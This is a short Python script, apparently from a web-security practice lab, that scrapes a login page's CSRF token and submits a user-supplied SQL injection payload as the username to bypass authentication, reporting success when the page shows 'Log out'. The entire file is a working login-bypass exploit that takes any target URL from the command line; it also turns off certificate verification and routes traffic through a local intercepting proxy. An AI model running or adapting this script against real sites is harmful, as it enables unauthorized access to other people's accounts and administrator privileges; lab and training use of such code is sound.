import requests
import sys
import urllib3
#from html.parser import HTMLParser
#import markupbase
from bs4 import BeautifulSoup
#from lxml import html

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
#print(proxies)

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    #print(r.text)
    soup = BeautifulSoup(r.text, 'html.parser')
    #soup = BeautifulSoup(r.text, 'lxml')
    #print(soup.prettify())
    csrf = soup.find("input") ['value']
    #print(csrf)
    return csrf
    

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data={"csrf" : csrf,
        "username": payload,
        "password": "randomtext"}

    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    #print(res)
    if "Log out" in res:
        return True
    else: 
        return False

if __name__ == "__main__":
    try:
        url=sys.argv[1].strip()
        print("url : ", url)
        sqli_payload = sys.argv[2].strip()
        print("sqli_payload : ", sqli_payload)
    except IndexError:
        print("[-] Usage: %s <url> <sql-payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' %sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    #print(s.text)
    

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! We have logged you in as administrator user.')
    else:
        print('[+] SQL injection unsuccessful!')